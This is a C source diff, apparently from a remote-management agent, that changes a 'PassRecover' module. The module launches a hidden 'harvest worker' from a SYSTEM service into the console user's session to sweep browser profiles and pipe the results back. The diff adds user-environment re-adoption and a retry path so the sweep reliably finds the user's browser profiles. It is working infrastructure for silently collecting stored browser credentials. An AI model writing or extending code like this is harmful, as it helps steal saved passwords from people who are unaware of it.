@@ -70,6 +70,11 @@ typedef NTSTATUS (NTAPI *PR_BC_InitAuthCipher_fn)(BCRYPT_KEY_HANDLE hKey, BCRYPT
 #pragma comment(lib, "userenv.lib")
 #pragma comment(lib, "credui.lib")
 
+/* The profile-path APIs are exported from userenv.dll at runtime but the
+ * 10.0.26100 SDK headers dropped their declarations. Plain prototypes (no
+ * dllimport) so the linker uses the classic imports from userenv.lib. */
+DWORD WINAPI GetUserProfileDirectoryW(HANDLE hToken, LPWSTR lpProfile, LPDWORD lpcchSize);
+
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
 #endif
@@ -1231,6 +1236,54 @@ static void PrReportAppend(PassRecover *pr, const char *entry)
 
 /* ------------------------------------------------------------- worker/pipe */
 
+/* The worker runs under the console user's primary token, but when it is
+ * launched with a NULL environment block it inherits the SERVICE's (SYSTEM)
+ * environment. Re-adopt the real user environment from our own token so the
+ * sweep finds the user's browser profiles no matter how we were launched. */
+static void PrAdoptUserEnv(void)
+{
+    static const wchar_t *kWhitelist[] = {
+        L"USERPROFILE", L"APPDATA", L"LOCALAPPDATA", L"USERNAME",
+        L"HOMEDRIVE", L"HOMEPATH", L"HOME", L"TEMP", L"TMP",
+        L"ALLUSERSPROFILE", L"PUBLIC", L"PATH", L"COMSPEC",
+        L"SYSTEMROOT", L"windir", L"OS", L"PATHEXT", L"LOGONSERVER",
+        L"USERDOMAIN", L"USERDNSDOMAIN", L"NUMBER_OF_PROCESSORS"
+    };
+    HANDLE tok;
+    LPVOID blk = NULL;
+    tok = GetCurrentProcessToken();
+    if (tok == NULL) { return; }
+    if (CreateEnvironmentBlock(&blk, tok, 0) == TRUE && blk != NULL)
+    {
+        wchar_t *p;
+        for (p = (wchar_t*)blk; *p != 0; p += wcslen(p) + 1)
+        {
+            wchar_t *eq = wcschr(p, L'=');
+            int i;
+            if (eq == NULL || eq == p) { continue; } /* malformed entry */
+            for (i = 0; i < (int)(sizeof(kWhitelist) / sizeof(kWhitelist[0])); i++)
+            {
+                if (_wcsnicmp(p, kWhitelist[i], (size_t)(eq - p)) == 0)
+                {
+                    SetEnvironmentVariableW(p, eq + 1);
+                    break;
+                }
+            }
+        }
+        DestroyEnvironmentBlock(blk);
+    }
+    else
+    {
+        wchar_t prof[MAX_PATH];
+        DWORD sz = MAX_PATH;
+        if (GetUserProfileDirectoryW(tok, prof, &sz) != 0)
+        {
+            SetEnvironmentVariableW(L"USERPROFILE", prof);
+        }
+    }
+    CloseHandle(tok);
+}
+
 /* Worker (runs in the user session): sweep + write JSONL to the pipe. */
 int ILibDuktape_PassRecoverWorker_Run(int argc, char **argv)
 {
@@ -1238,6 +1291,7 @@ int ILibDuktape_PassRecoverWorker_Run(int argc, char **argv)
     HANDLE pipe;
     DWORD written = 0;
     (void)argc; (void)argv;
+    PrAdoptUserEnv();
     PrJson_Init(&doc);
     PrDoSweep(&doc);
     pipe = CreateFileW(PR_PIPE_NAME, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
@@ -1309,10 +1363,31 @@ static int PrHarvestViaWorker(PassRecover *pr, PrJson *out)
     ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
     si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
     ZeroMemory(&pi, sizeof(pi));
-    if (CreateProcessAsUserW(dup, exe, cmd, NULL, NULL, FALSE, 0, env, wdir, &si, &pi) == FALSE)
     {
-        PrSetError(pr, "could not launch the harvest worker");
-        goto done;
+        DWORD e1 = 0, e2 = 0;
+        if (CreateProcessAsUserW(dup, exe, cmd, NULL, NULL, FALSE, 0, env, wdir, &si, &pi) == FALSE)
+        {
+            e1 = GetLastError();
+            if (env != NULL)
+            {
+                /* Some Windows builds reject the CreateEnvironmentBlock block
+                 * with ERROR_ENVVAR_NOT_FOUND (203). The worker re-adopts the
+                 * user environment from its own token, so a NULL-env launch
+                 * (inheriting the service env) works just as well. */
+                ZeroMemory(&pi, sizeof(pi));
+                if (CreateProcessAsUserW(dup, exe, cmd, NULL, NULL, FALSE, 0, NULL, wdir, &si, &pi) == FALSE)
+                {
+                    e2 = GetLastError();
+                    PrSetError(pr, "could not launch the harvest worker (env err=%lu, noenv err=%lu)", (unsigned long)e1, (unsigned long)e2);
+                    goto done;
+                }
+            }
+            else
+            {
+                PrSetError(pr, "could not launch the harvest worker (err=%lu)", (unsigned long)e1);
+                goto done;
+            }
+        }
     }
     CloseHandle(pi.hThread);
 
